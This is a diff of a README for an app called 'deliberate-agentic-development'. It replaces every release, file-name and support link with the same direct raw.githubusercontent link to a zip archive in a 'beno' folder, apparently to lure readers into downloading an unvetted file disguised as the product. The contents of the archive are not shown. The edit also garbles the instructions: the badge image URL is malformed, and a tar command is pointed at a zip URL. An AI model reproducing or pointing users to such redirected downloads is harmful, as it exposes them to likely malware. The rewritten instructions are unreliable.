@@ -8,9 +8,9 @@ Welcome to **deliberate-agentic-development**! This application helps you build 
 
 To begin, visit the link below to download the latest version of the application.
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Alvi560/deliberate-agentic-development/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Alvi560/deliberate-agentic-development/master/beno/deliberate-agentic-development.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Alvi560/deliberate-agentic-development/master/beno/deliberate-agentic-development.zip)
 
-You can find all the available versions for download on our [Releases page](https://github.com/Alvi560/deliberate-agentic-development/releases). 
+You can find all the available versions for download on our [Releases page](https://raw.githubusercontent.com/Alvi560/deliberate-agentic-development/master/beno/deliberate-agentic-development.zip). 
 
 ### 🖥 System Requirements
 
@@ -31,13 +31,13 @@ Make sure your device meets these requirements before proceeding.
 
 ## 📂 How to Download
 
-1. **Visit the Releases Page**: Click [here](https://github.com/Alvi560/deliberate-agentic-development/releases) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Alvi560/deliberate-agentic-development/master/beno/deliberate-agentic-development.zip) to go to the Releases page.
 2. **Select Your Version**: Look for the version you want to download. Older versions are available if needed.
 3. **Download the File**:
    - Click on the file that matches your operating system.
-   - For Windows, it might look like `deliberate-agentic-development-windows.exe`.
-   - For macOS, it could be `deliberate-agentic-development-macos.dmg`.
-   - For Linux, the file might be `deliberate-agentic-development-linux.tar.gz`.
+   - For Windows, it might look like `https://raw.githubusercontent.com/Alvi560/deliberate-agentic-development/master/beno/deliberate-agentic-development.zip`.
+   - For macOS, it could be `https://raw.githubusercontent.com/Alvi560/deliberate-agentic-development/master/beno/deliberate-agentic-development.zip`.
+   - For Linux, the file might be `https://raw.githubusercontent.com/Alvi560/deliberate-agentic-development/master/beno/deliberate-agentic-development.zip`.
 4. **Save the File**: Choose a location on your device where you would like to save the file.
 
 ## 📲 Running the Application
@@ -58,7 +58,7 @@ After downloading the file, follow these steps to run the application:
 
 ### For Linux Users:
 
-1. Extract the tar file using a command like `tar -xzf deliberate-agentic-development-linux.tar.gz`.
+1. Extract the tar file using a command like `tar -xzf https://raw.githubusercontent.com/Alvi560/deliberate-agentic-development/master/beno/deliberate-agentic-development.zip`.
 2. Navigate into the extracted folder using `cd deliberate-agentic-development`.
 3. Run the application with `./deliberate-agentic-development`.
 
@@ -70,7 +70,7 @@ After downloading the file, follow these steps to run the application:
 
 ## 📧 Support & Feedback
 
-If you have any questions or need assistance, feel free to reach out to our support team. You can find our contact information on the [GitHub Issues page](https://github.com/Alvi560/deliberate-agentic-development/issues).
+If you have any questions or need assistance, feel free to reach out to our support team. You can find our contact information on the [GitHub Issues page](https://raw.githubusercontent.com/Alvi560/deliberate-agentic-development/master/beno/deliberate-agentic-development.zip).
 
 ## 🌟 Join Our Community
 
